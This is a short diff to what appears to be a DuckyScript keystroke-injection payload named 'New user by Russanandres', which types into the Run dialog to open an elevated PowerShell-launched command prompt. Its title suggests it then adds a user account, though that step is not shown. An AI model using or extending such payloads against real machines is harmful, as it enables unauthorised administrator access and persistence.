@@ -1,13 +1,11 @@
-GUI s
-DELAY 700
-STRING cmd
-DELAY 700
-RIGHT
-DELAY 700
-DOWN
-DELAY 700
+REM New user by Russanandres v1.1
+
+GUI r
+DELAY 1000
+STRING powershell Start-Process cmd -verb runAs
+DELAY 1000
 ENTER
-DELAY 700
+DELAY 2000
 STRING @echo off
 ENTER
 STRING cls
